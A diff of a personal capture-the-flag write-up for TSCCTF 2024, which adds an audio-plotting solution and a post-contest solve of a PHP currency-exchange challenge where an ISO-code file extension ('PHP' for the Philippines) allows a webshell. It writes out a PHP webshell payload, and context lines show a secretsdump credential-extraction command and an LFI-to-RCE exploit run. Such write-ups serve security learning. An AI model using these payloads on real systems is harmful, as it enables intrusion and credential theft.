@@ -1,11 +1,11 @@
-# TSCCTF 2024 - SBK6401 WP
+# TSCCTF 2024
+![image](https://hackmd.io/_uploads/BJLmu63Y6.png)
 
 ## Misc
-
 ### AKA
 #### Source Code
 :::spoiler IDA
-```cpp
+```cpp=
 __int64 flag_function()
 {
   // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
@@ -95,7 +95,7 @@ LABEL_11:
 逆向一下會發現關鍵的code如上，接著就是考驗逆向的功力，可以稍微喵一下dll裡面export出的東西有`flag`, `Roflcopter`和`hint`這三個function
 ![圖片](https://hackmd.io/_uploads/SyicGbdYT.png)
 不過看PE file中有提到執行資料夾中只允許有兩個file
-```cpp24
+```cpp=24
   if ( num_of_files > 2 )
   {
     v6 = strcpy(buf, "We don't want too many files here.");
@@ -110,7 +110,7 @@ LABEL_11:
   }
 ```
 並且下面接續一些判斷有無把dll成功load進來的一些判斷，所以一開始的想法是直接patch，讓他可以不需要管有多少檔案在同一個資料夾，另外一件事情是我們的目標應該會放在最後幾行
-```cpp76
+```cpp=76
   flag = (void (*)(void))GetProcAddress(flag_dll, "flag");
   if ( flag )
     flag();
@@ -176,7 +176,7 @@ Flag: `TSC{Wh47_yoU_53e_IS_noT_Wh@t_YoU_9Et}`
     ```bash
     $ ./secretsdump.py -ntds ./Active\ Directory/ntds.dit -system ./registry/SYSTEM LOCAL -outputfile ./myhashes.txt
     Impacket v0.11.0 - Copyright 2023 Fortra
-    
+
     [*] Target system bootKey: 0xa8b93f7180a58e68855a3bc7b78a2fee
     [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
     [*] Searching for pekList, be patient
@@ -220,13 +220,60 @@ Flag: `TSC{Wh47_yoU_53e_IS_noT_Wh@t_YoU_9Et}`
     ![圖片](https://hackmd.io/_uploads/rkvM1dKKT.png)
     而理論上來說FQDN應該是[hostname].[domain]兩個串在一起才是unique FQDN，但作者說其實只需要domain就好，所以最後的flag會是`TSC{tsc_ctf_AD.local_welcome}`
     
-
 Flag: `TSC{tsc_ctf_AD.local_welcome}`
+### TL;DL
+#### Hint
+* Hint 1
+    > len(flag) > 20
+* Hint 2
+    > How many channels does the audio file have?
+* Hint 3
+    > Cogito, ergo sum
+* Hint 4
+    > Are you familiar with the tool used to display signal voltages?
+* Hint 5
+    > ![BkfafXhYa](https://hackmd.io/_uploads/rkOqByWja.png)
+
+#### Recon
+這一題真的太難了，不過也是有一點有趣，Hint也是給了超多但還是只有一個人解出來，@ywc真的太鬼了這一題也是賽後解
+從題目給的hint可以知道1. 笛卡爾, 2. 直角坐標, 3. 音頻振幅
+此時針對這種腦動就要越開越好，如果把振幅畫出來會怎麼樣呢?其實就是這麼簡單，但綜觀網路上的資源或是之前打過的題目都沒有這樣類似的題目，所以自己寫個script如下，嘗試把圖案畫出來。
+
+:::info
+順帶一提，看了@ywc大神的WP後才知道其實沒有那麼通靈，因為一開始import進去Audacity後雖然看似啥都沒有，我也按照之前的經驗用頻譜去看，但是依然只有看似是摩斯密碼的東西，此時只要採用正規劃就可以看出一些些端倪了
+![圖片](https://hackmd.io/_uploads/ByKFrZWjT.png)
+
+![圖片](https://hackmd.io/_uploads/ry8cr-ZoT.png)
+:::
+#### Exploit
+順帶一題，讀取這一題的音檔不能用wave這個library，因為這一題的音檔不是一個標準的PCM編碼的.wav檔案。wave library只支援PCM編碼的.wav檔案。
+```python=
+from scipy.io import wavfile
+import matplotlib.pyplot as plt
+
+sample_rate, data = wavfile.read('./TSCCTF 2024/Misc/TL;DL/flag-tldl.wav')
+
+left_channel = data[:, 0]
+right_channel = data[:, 1]
+
+plt.figure()
+plt.plot(left_channel, right_channel)
+
+# Add labels
+plt.xlabel('x')
+plt.ylabel('y')
+plt.title('A simple plot')
+
+plt.show()
+```
+![flag](https://hackmd.io/_uploads/Sk1t4JZjT.png)
+
+Flag: `TSC{V3ry_10Ud_d1R3c7_CUrR3N7_Bu7_1n_32-b17_f1047}`
 ## Reverse
 ### sHELLcode
 #### Source Code
 :::spoiler IDA main function
-```cpp
+```cpp=
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   int v3; // eax
@@ -308,7 +355,7 @@ Flag: `TCLCTF{Now_ur_A_sHELLcode_M4sTer}`
 ## PWN
 ### ret2libc
 #### Source Code
-```cpp
+```cpp=
 #include <stdio.h>
 #include <stdio.h>
 
@@ -389,13 +436,13 @@ r.interactive()
     <?php
     include('config.php');
     echo '<h1>👻 Stage 1 / 4</h1>';
-    
+
     $A = $_GET['A'];
     $B = $_GET['B'];
-    
+
     highlight_file(__FILE__);
     echo '<hr>';
-    
+
     if (isset($A) && isset($B))
         if ($A != $B)
             if (strcmp($A, $B) == 0)
@@ -420,13 +467,13 @@ r.interactive()
     <?php
     include('config.php');
     echo '<h1>👻 Stage 2 / 4</h1>';
-    
+
     $A = $_GET['A'];
     $B = $_GET['B'];
-    
+
     highlight_file(__FILE__);
     echo '<hr>';
-    
+
     if (isset($A) && isset($B))
         if ($A !== $B){
             $is_same = md5($A) == 0 and md5($B) === 0;
@@ -456,14 +503,14 @@ r.interactive()
     <?php
     include('config.php');
     echo '<h1>👻 Stage 3 / 4</h1>';
-    
+
     $page = $_GET['page'];
-    
+
     highlight_file(__FILE__);
     echo '<hr>';
     if (isset($page)) {
         $path = strtolower($_GET['page']);
-    
+
         // filter \ _ /
         if (preg_match("/\\_|\//", $path)) {
             echo "<p>bad hecker detect! </p>";
@@ -484,7 +531,7 @@ r.interactive()
 這一題是最難的，最後忍不住還是去看了教學，但跟著做還是要花好久的功夫才能打穿，這一題就是典型的LFI2RCE的題目，一開始是看[飛飛的文章](https://ithelp.ithome.com.tw/articles/10241555)，發現他可以成功query`../../../../../proc/self/environ`這個東西，所以有一大半時間都在找如何用這個東西inject webshell達到RCE，但不確定是權限不夠還是怎麼樣，過程中困難重重也沒有快要成功的跡象，因此就只能嘗試教學中提到的php filter chain，話說[steven的文章](https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/)很優質耶，已經是一個php lfi2rce的教科書了，重點是察看的payload來源於[wupco大的script](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)也是怎麼試都不成功，最後是察看[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)這篇文章才解決，我是用[他們自己寫的script](https://github.com/synacktiv/php_filter_chain_generator)，不確定是哪個環節出問題
 #### Exploit
 Script For Stage 4
-```python
+```python=
 import requests
 import subprocess
 from sys import *
@@ -539,11 +586,468 @@ $ python exp.py cat /flag_cr14x5hc
 ```
 
 Flag: `TSC{y0u_4r3_my_0ld_p4l}`
+### Palitan ng pera(賽後解)
+#### Description
+> It's a currency exchange website.
+>
+> Author: Vincent55
+> Official Writeup - https://github.com/Vincent550102/My-CTF-Challenge/tree/main/TSCCTF-2024#palitan-ng-pera
+#### Source Code
+* docker-compose.yml
+    ```dockerfile!
+    version: "3.5"
+    services:
+        exchange:
+            build:
+                context: ./src
+                args:
+                    FLAG: TSCCTF{FAKEFLAG} 
+            ports:
+                - 33000:80/tcp
+    ```
+* Dockerfile
+    ```dockerfile!
+    FROM php:7.4.33-apache
+
+    COPY . /var/www/html
+
+    RUN chown -R www-data:www-data /var/www/html && \
+        chmod -R 555 /var/www/html && \
+        chown www-data:www-data /var/www/html/upload && \
+        chmod 775 /var/www/html/upload
+
+    ARG FLAG
+    RUN echo $FLAG > /flag-`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`
+
+    RUN echo "AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP" >>/etc/apache2/apache2.conf
+    USER www-data
+    ```
+* currency.php
+    :::spoiler Source Code
+    ```php
+    <?php
+
+    # from https://en.wikipedia.org/wiki/List_of_circulating_currencies
+
+    # The exchange rate are unrelated to the solution, so they are all set to 0.87 :>
+
+    $countryData = array(
+        "Afghanistan" => array("ISO" => "AFN", "toTWD" => 0.87),
+        "Akrotiri and Dhekelia" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Albania" => array("ISO" => "ALL", "toTWD" => 0.87),
+        "Algeria" => array("ISO" => "DZD", "toTWD" => 0.87),
+        "Andorra" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Angola" => array("ISO" => "AOA", "toTWD" => 0.87),
+        "Anguilla" => array("ISO" => "XCD", "toTWD" => 0.87),
+        "Antigua and Barbuda" => array("ISO" => "XCD", "toTWD" => 0.87),
+        "Argentina" => array("ISO" => "ARS", "toTWD" => 0.87),
+        "Armenia" => array("ISO" => "AMD", "toTWD" => 0.87),
+        "Artsakh" => array("ISO" => "none", "toTWD" => 0.87),
+        "Aruba" => array("ISO" => "AWG", "toTWD" => 0.87),
+        "Ascension Island" => array("ISO" => "SHP", "toTWD" => 0.87),
+        "Australia" => array("ISO" => "AUD", "toTWD" => 0.87),
+        "Austria" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Azerbaijan" => array("ISO" => "AZN", "toTWD" => 0.87),
+        "Bahamas, The" => array("ISO" => "BSD", "toTWD" => 0.87),
+        "Bahrain" => array("ISO" => "BHD", "toTWD" => 0.87),
+        "Bangladesh" => array("ISO" => "BDT", "toTWD" => 0.87),
+        "Barbados" => array("ISO" => "BBD", "toTWD" => 0.87),
+        "Belarus" => array("ISO" => "BYN", "toTWD" => 0.87),
+        "Belgium" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Belize" => array("ISO" => "BZD", "toTWD" => 0.87),
+        "Benin" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Bermuda" => array("ISO" => "BMD", "toTWD" => 0.87),
+        "Bhutan" => array("ISO" => "BTN", "toTWD" => 0.87),
+        "Bolivia" => array("ISO" => "BOB", "toTWD" => 0.87),
+        "Bonaire" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Bosnia and Herzegovina" => array("ISO" => "BAM", "toTWD" => 0.87),
+        "Botswana" => array("ISO" => "BWP", "toTWD" => 0.87),
+        "Brazil" => array("ISO" => "BRL", "toTWD" => 0.87),
+        "British Indian Ocean Territory" => array("ISO" => "USD", "toTWD" => 0.87),
+        "British Virgin Islands" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Brunei" => array("ISO" => "BND", "toTWD" => 0.87),
+        "Bulgaria" => array("ISO" => "BGN", "toTWD" => 0.87),
+        "Burkina Faso" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Burundi" => array("ISO" => "BIF", "toTWD" => 0.87),
+        "Cambodia" => array("ISO" => "KHR", "toTWD" => 0.87),
+        "Cameroon" => array("ISO" => "XAF", "toTWD" => 0.87),
+        "Canada" => array("ISO" => "CAD", "toTWD" => 0.87),
+        "Cape Verde" => array("ISO" => "CVE", "toTWD" => 0.87),
+        "Cayman Islands" => array("ISO" => "KYD", "toTWD" => 0.87),
+        "Central African Republic" => array("ISO" => "XAF", "toTWD" => 0.87),
+        "Chad" => array("ISO" => "XAF", "toTWD" => 0.87),
+        "Chile" => array("ISO" => "CLP", "toTWD" => 0.87),
+        "China, People's Republic of" => array("ISO" => "CNY", "toTWD" => 0.87),
+        "Colombia" => array("ISO" => "COP", "toTWD" => 0.87),
+        "Comoros" => array("ISO" => "KMF", "toTWD" => 0.87),
+        "Congo, Democratic Republic of the" => array("ISO" => "CDF", "toTWD" => 0.87),
+        "Congo, Republic of the" => array("ISO" => "XAF", "toTWD" => 0.87),
+        "Cook Islands" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Costa Rica" => array("ISO" => "CRC", "toTWD" => 0.87),
+        "Côte d'Ivoire" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Croatia" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Cuba" => array("ISO" => "CUP", "toTWD" => 0.87),
+        "Curaçao" => array("ISO" => "ANG", "toTWD" => 0.87),
+        "Cyprus" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Czech Republic" => array("ISO" => "CZK", "toTWD" => 0.87),
+        "Denmark" => array("ISO" => "DKK", "toTWD" => 0.87),
+        "Djibouti" => array("ISO" => "DJF", "toTWD" => 0.87),
+        "Dominica" => array("ISO" => "XCD", "toTWD" => 0.87),
+        "Dominican Republic" => array("ISO" => "DOP", "toTWD" => 0.87),
+        "East Timor" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Ecuador" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Egypt" => array("ISO" => "EGP", "toTWD" => 0.87),
+        "El Salvador" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Equatorial Guinea" => array("ISO" => "XAF", "toTWD" => 0.87),
+        "Eritrea" => array("ISO" => "ERN", "toTWD" => 0.87),
+        "Estonia" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Eswatini" => array("ISO" => "SZL", "toTWD" => 0.87),
+        "Ethiopia" => array("ISO" => "ETB", "toTWD" => 0.87),
+        "Falkland Islands" => array("ISO" => "FKP", "toTWD" => 0.87),
+        "Faroe Islands" => array("ISO" => "DKK", "toTWD" => 0.87),
+        "Fiji" => array("ISO" => "FJD", "toTWD" => 0.87),
+        "Finland" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "France" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "French Polynesia" => array("ISO" => "XPF", "toTWD" => 0.87),
+        "French Southern and Antarctic Lands" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Gabon" => array("ISO" => "XAF", "toTWD" => 0.87),
+        "Gambia, The" => array("ISO" => "GMD", "toTWD" => 0.87),
+        "Georgia" => array("ISO" => "GEL", "toTWD" => 0.87),
+        "Germany" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Ghana" => array("ISO" => "GHS", "toTWD" => 0.87),
+        "Gibraltar" => array("ISO" => "GIP", "toTWD" => 0.87),
+        "Greece" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Greenland" => array("ISO" => "DKK", "toTWD" => 0.87),
+        "Grenada" => array("ISO" => "XCD", "toTWD" => 0.87),
+        "Guatemala" => array("ISO" => "GTQ", "toTWD" => 0.87),
+        "Guinea" => array("ISO" => "GNF", "toTWD" => 0.87),
+        "Guinea-Bissau" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Guyana" => array("ISO" => "GYD", "toTWD" => 0.87),
+        "Haiti" => array("ISO" => "HTG", "toTWD" => 0.87),
+        "Honduras" => array("ISO" => "HNL", "toTWD" => 0.87),
+        "Hong Kong" => array("ISO" => "HKD", "toTWD" => 0.87),
+        "Hungary" => array("ISO" => "HUF", "toTWD" => 0.87),
+        "Iceland" => array("ISO" => "ISK", "toTWD" => 0.87),
+        "India" => array("ISO" => "INR", "toTWD" => 0.87),
+        "Indonesia" => array("ISO" => "IDR", "toTWD" => 0.87),
+        "Iran" => array("ISO" => "IRR", "toTWD" => 0.87),
+        "Iraq" => array("ISO" => "IQD", "toTWD" => 0.87),
+        "Ireland" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Isle of Man" => array("ISO" => "none", "toTWD" => 0.87),
+        "Israel" => array("ISO" => "ILS", "toTWD" => 0.87),
+        "Italy" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Jamaica" => array("ISO" => "JMD", "toTWD" => 0.87),
+        "Japan" => array("ISO" => "JPY", "toTWD" => 0.87),
+        "Jersey" => array("ISO" => "none", "toTWD" => 0.87),
+        "Jordan" => array("ISO" => "JOD", "toTWD" => 0.87),
+        "Kazakhstan" => array("ISO" => "KZT", "toTWD" => 0.87),
+        "Kenya" => array("ISO" => "KES", "toTWD" => 0.87),
+        "Kiribati" => array("ISO" => "none", "toTWD" => 0.87),
+        "Korea, North" => array("ISO" => "KPW", "toTWD" => 0.87),
+        "Korea, South" => array("ISO" => "KRW", "toTWD" => 0.87),
+        "Kosovo" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Kuwait" => array("ISO" => "KWD", "toTWD" => 0.87),
+        "Kyrgyzstan" => array("ISO" => "KGS", "toTWD" => 0.87),
+        "Laos" => array("ISO" => "LAK", "toTWD" => 0.87),
+        "Latvia" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Lebanon" => array("ISO" => "LBP", "toTWD" => 0.87),
+        "Lesotho" => array("ISO" => "LSL", "toTWD" => 0.87),
+        "Liberia" => array("ISO" => "LRD", "toTWD" => 0.87),
+        "Libya" => array("ISO" => "LYD", "toTWD" => 0.87),
+        "Liechtenstein" => array("ISO" => "CHF", "toTWD" => 0.87),
+        "Lithuania" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Luxembourg" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Macau" => array("ISO" => "MOP", "toTWD" => 0.87),
+        "Madagascar" => array("ISO" => "MGA", "toTWD" => 0.87),
+        "Malawi" => array("ISO" => "MWK", "toTWD" => 0.87),
+        "Malaysia" => array("ISO" => "MYR", "toTWD" => 0.87),
+        "Maldives" => array("ISO" => "MVR", "toTWD" => 0.87),
+        "Mali" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Malta" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Marshall Islands" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Mauritania" => array("ISO" => "MRU", "toTWD" => 0.87),
+        "Mauritius" => array("ISO" => "MUR", "toTWD" => 0.87),
+        "Mexico" => array("ISO" => "MXN", "toTWD" => 0.87),
+        "Micronesia" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Moldova" => array("ISO" => "MDL", "toTWD" => 0.87),
+        "Monaco" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Mongolia" => array("ISO" => "MNT", "toTWD" => 0.87),
+        "Montenegro" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Montserrat" => array("ISO" => "XCD", "toTWD" => 0.87),
+        "Morocco" => array("ISO" => "MAD", "toTWD" => 0.87),
+        "Mozambique" => array("ISO" => "MZN", "toTWD" => 0.87),
+        "Myanmar" => array("ISO" => "MMK", "toTWD" => 0.87),
+        "Namibia" => array("ISO" => "NAD", "toTWD" => 0.87),
+        "Nauru" => array("ISO" => "AUD", "toTWD" => 0.87),
+        "Nepal" => array("ISO" => "NPR", "toTWD" => 0.87),
+        "Netherlands" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "New Caledonia" => array("ISO" => "XPF", "toTWD" => 0.87),
+        "New Zealand" => array("ISO" => "NZD", "toTWD" => 0.87),
+        "Nicaragua" => array("ISO" => "NIO", "toTWD" => 0.87),
+        "Niger" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Nigeria" => array("ISO" => "NGN", "toTWD" => 0.87),
+        "Niue" => array("ISO" => "NZD", "toTWD" => 0.87),
+        "North Macedonia" => array("ISO" => "MKD", "toTWD" => 0.87),
+        "Northern Cyprus" => array("ISO" => "TRY", "toTWD" => 0.87),
+        "Norway" => array("ISO" => "NOK", "toTWD" => 0.87),
+        "Oman" => array("ISO" => "OMR", "toTWD" => 0.87),
+        "Pakistan" => array("ISO" => "PKR", "toTWD" => 0.87),
+        "Palau" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Palestine" => array("ISO" => "ILS", "toTWD" => 0.87),
+        "Panama" => array("ISO" => "PAB", "toTWD" => 0.87),
+        "Papua New Guinea" => array("ISO" => "PGK", "toTWD" => 0.87),
+        "Paraguay" => array("ISO" => "PYG", "toTWD" => 0.87),
+        "Peru" => array("ISO" => "PEN", "toTWD" => 0.87),
+        "Philippines" => array("ISO" => "PHP", "toTWD" => 0.87),
+        "Pitcairn Islands" => array("ISO" => "NZD", "toTWD" => 0.87),
+        "Poland" => array("ISO" => "PLN", "toTWD" => 0.87),
+        "Portugal" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Qatar" => array("ISO" => "QAR", "toTWD" => 0.87),
+        "Romania" => array("ISO" => "RON", "toTWD" => 0.87),
+        "Russia" => array("ISO" => "RUB", "toTWD" => 0.87),
+        "Rwanda" => array("ISO" => "RWF", "toTWD" => 0.87),
+        "Saba" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Sahrawi Republic" => array("ISO" => "MAD", "toTWD" => 0.87),
+        "Saint Helena" => array("ISO" => "SHP", "toTWD" => 0.87),
+        "Saint Kitts and Nevis" => array("ISO" => "XCD", "toTWD" => 0.87),
+        "Saint Lucia" => array("ISO" => "XCD", "toTWD" => 0.87),
+        "Saint Pierre and Miquelon" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Samoa" => array("ISO" => "WST", "toTWD" => 0.87),
+        "Saint Barthélemy" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "San Marino" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "São Tomé and Príncipe" => array("ISO" => "STN", "toTWD" => 0.87),
+        "Saudi Arabia" => array("ISO" => "SAR", "toTWD" => 0.87),
+        "Senegal" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Serbia" => array("ISO" => "RSD", "toTWD" => 0.87),
+        "Seychelles" => array("ISO" => "SCR", "toTWD" => 0.87),
+        "Sierra Leone" => array("ISO" => "SLE", "toTWD" => 0.87),
+        "Singapore" => array("ISO" => "SGD", "toTWD" => 0.87),
+        "Sint Eustatius" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Sint Maarten" => array("ISO" => "ANG", "toTWD" => 0.87),
+        "Slovakia" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Slovenia" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Solomon Islands" => array("ISO" => "SBD", "toTWD" => 0.87),
+        "Somalia" => array("ISO" => "SOS", "toTWD" => 0.87),
+        "South Africa" => array("ISO" => "ZAR", "toTWD" => 0.87),
+        "South Ossetia" => array("ISO" => "RUB", "toTWD" => 0.87),
+        "South Sudan" => array("ISO" => "SSP", "toTWD" => 0.87),
+        "Spain" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Sri Lanka" => array("ISO" => "LKR", "toTWD" => 0.87),
+        "Sudan" => array("ISO" => "SDG", "toTWD" => 0.87),
+        "Suriname" => array("ISO" => "SRD", "toTWD" => 0.87),
+        "Sweden" => array("ISO" => "SEK", "toTWD" => 0.87),
+        "Switzerland" => array("ISO" => "CHF", "toTWD" => 0.87),
+        "Syria" => array("ISO" => "SYP", "toTWD" => 0.87),
+        "Taiwan / Republic of China" => array("ISO" => "TWD", "toTWD" => 0.87),
+        "Tajikistan" => array("ISO" => "TJS", "toTWD" => 0.87),
+        "Tanzania" => array("ISO" => "TZS", "toTWD" => 0.87),
+        "Thailand" => array("ISO" => "THB", "toTWD" => 0.87),
+        "Togo" => array("ISO" => "XOF", "toTWD" => 0.87),
+        "Tonga" => array("ISO" => "TOP", "toTWD" => 0.87),
+        "Transnistria" => array("ISO" => "RUB", "toTWD" => 0.87),
+        "Trinidad and Tobago" => array("ISO" => "TTD", "toTWD" => 0.87),
+        "Tunisia" => array("ISO" => "TND", "toTWD" => 0.87),
+        "Turkey" => array("ISO" => "TRY", "toTWD" => 0.87),
+        "Turkmenistan" => array("ISO" => "TMT", "toTWD" => 0.87),
+        "Turks and Caicos Islands" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Tuvalu" => array("ISO" => "AUD", "toTWD" => 0.87),
+        "Uganda" => array("ISO" => "UGX", "toTWD" => 0.87),
+        "Ukraine" => array("ISO" => "UAH", "toTWD" => 0.87),
+        "United Arab Emirates" => array("ISO" => "AED", "toTWD" => 0.87),
+        "United Kingdom" => array("ISO" => "GBP", "toTWD" => 0.87),
+        "United States" => array("ISO" => "USD", "toTWD" => 0.87),
+        "Uruguay" => array("ISO" => "UYU", "toTWD" => 0.87),
+        "Uzbekistan" => array("ISO" => "UZS", "toTWD" => 0.87),
+        "Vanuatu" => array("ISO" => "VUV", "toTWD" => 0.87),
+        "Vatican City" => array("ISO" => "EUR", "toTWD" => 0.87),
+        "Venezuela" => array("ISO" => "VES", "toTWD" => 0.87),
+        "Vietnam" => array("ISO" => "VND", "toTWD" => 0.87),
+        "Wallis and Futuna" => array("ISO" => "XPF", "toTWD" => 0.87),
+        "Yemen" => array("ISO" => "YER", "toTWD" => 0.87),
+        "Zambia" => array("ISO" => "ZMW", "toTWD" => 0.87),
+        "Zimbabwe" => array("ISO" => "none", "toTWD" => 0.87),
+    );
+    ```
+    :::
+* index.php
+    :::spoiler Source Code
+    ```php=
+    <?php
+    error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);
+    include("currency.php");
+
+    $resultLink = "";
+
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        $region = $_POST["region"];
+        $amount = $_POST["amount"];
+
+        $isoName = $countryData[$region]["ISO"];
+        $rate = $countryData[$region]["toTWD"];
+
+        $convertedAmount = $amount * $rate ?: $amount;
+
+        $htmlContent = "<html><body>";
+        $htmlContent .= "<h1> Exchange result </h1>";
+        $htmlContent .= "<p>{$amount} TWD = {$convertedAmount} {$isoName}</p>";
+        $htmlContent .= "<a href='/'>Back to Home</a></body></html>";
+
+        $filePath = "upload/" . md5(uniqid()) . "." . $isoName;
+        file_put_contents($filePath, $htmlContent);
+
+        $resultLink = "<a href='" . $filePath . "'> 👁️ exchange result</a>";
+    }
+    ?>
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>🪙Exchange Station</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.css" />
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocas/4.2.5/tocas.min.js"></script>
+
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;700&display=swap" rel="stylesheet" />
+
+    </head>
+    <body>
+        <div class="ts-segment">
+            <div class="ts-app-navbar is-fluid">
+                <a class="item">
+                    <div class="ts-icon is-house-icon"></div>
+                    <div class="label">Home</div>
+                </a>
+            </div>
+        </div>
+        <br>
+        <br>
+        <div class="ts-container is-very-narrow">
+        <fieldset class="ts-fieldset">
+        <legend>🪙Exchange Station</legend>
+            <form action="" method="post">
+                <label for="region">🌏Region</label>
+                <div class="ts-select">
+                    <select name="region" id="region">
+                        <?php foreach ($countryData as $region => $data): ?>
+                            <option value="<?php echo $region; ?>"><?php echo $region; ?></option>
+                        <?php endforeach; ?>
+                    </select>
+                </div>
+                <br>
+                <br>
+                <div class="ts-input is-labeled">
+                    <span class="label">💵Amount </span>
+                    <input type="text" id="amount" name="amount" required>
+                    <span class="label">TWD</span>
+                </div>
+                <br>
+                <button class="ts-button">Submit</button>
+            </form>
+            <?php
+            if ($resultLink) {
+                echo $resultLink;
+            }
+            ?>
+            </fieldset>
+        </div>
+    </body>
+    </html>
+    ```
+    :::
+#### Recon
+這一題是賽後解，所以參考了官解，其實我快要接近答案了，思考的邏輯也沒有錯，只是真的不夠細心，沒有觀察到小巧思
+1. 先觀察dockerfile，可以發現我們要找的flag就是在根目錄，所以沒意外應該是要拿到shell
+2. 再看這隻程式在幹麻
+    這個網站就只有轉換匯率的功能，轉換匯率的table就放在currency.php，首先前端可選擇要轉換的國家幣值，然後填入數字他就會把這兩個parameters存成一個檔案，接著我們就可query他
+3. 出現問題的code
+    ```php=
+    <?php
+    error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE);
+    include("currency.php");
+
+    $resultLink = "";
+
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        $region = $_POST["region"];
+        $amount = $_POST["amount"];
+
+        $isoName = $countryData[$region]["ISO"];
+        $rate = $countryData[$region]["toTWD"];
+
+        $convertedAmount = $amount * $rate ?: $amount;
+
+        $htmlContent = "<html><body>";
+        $htmlContent .= "<h1> Exchange result </h1>";
+        $htmlContent .= "<p>{$amount} TWD = {$convertedAmount} {$isoName}</p>";
+        $htmlContent .= "<a href='/'>Back to Home</a></body></html>";
+
+        $filePath = "upload/" . md5(uniqid()) . "." . $isoName;
+        file_put_contents($filePath, $htmlContent);
+
+        $resultLink = "<a href='" . $filePath . "'> 👁️ exchange result</a>";
+    }
+    ?>
+    ```
+    前一段所說的功能就是這一段在做的事情，而從docker後台也可以看到一樣的狀況
+    ![image](https://hackmd.io/_uploads/Hy9HFqgop.png)
+    在docker中的/upload/就會存成這樣的內容
+    ![image](https://hackmd.io/_uploads/S1MOY9esa.png)
+    所以是不是我們可以填入最基本的webshell後，當我們query這個file時就自動跑起來
+4. 遭遇的困難
+    如果只是利用剛剛的狀態直接寫`<?php system($_GET['sh']); ?>`，會不成功，原因是雖然後端還是儲存成一個看起來像webshell的內容但是，送到前端被render後會被當作一般的comment，這也是我一開始卡的地方
+    ![image](https://hackmd.io/_uploads/rkqK9cesT.png)
+5. How to solve?
+    可以觀察前面的dockerfile，倒數第二行的
+    > AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP
+    根據chatgpt:
+    > 在Apache的配置文件 `/etc/apache2/apache2.conf` 中添加 `AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP` 的意思是告訴Apache服務器將以 `.php`, `.Php`, `.pHp`, `.phP`, `.pHP`, `.PHp`, `.PHP` 結尾的文件視為PHP腳本文件進行解析和執行。這樣做可以確保Apache在收到這些文件請求時，將它們交給PHP解釋器處理，而不是簡單地將它們作為靜態文件發送給客戶端。
+
+    (也就是說如果作者沒有加上這一段的話就不用玩了，應該ㄅ...)
+
+    所以我們要做的就很簡單了,看哪一個國家的縮寫是php相關的，只要選取該國家，後端就會把檔案取名成`.PHP`，翻了一下currency.php發現是==菲律賓==，所以只要選取菲律賓，並且用最簡單的php websehll就可以達到RCE
+    ![image](https://hackmd.io/_uploads/SkOzHCeia.png)
+6. 成功RCE
+    Payload: 
+    ```url
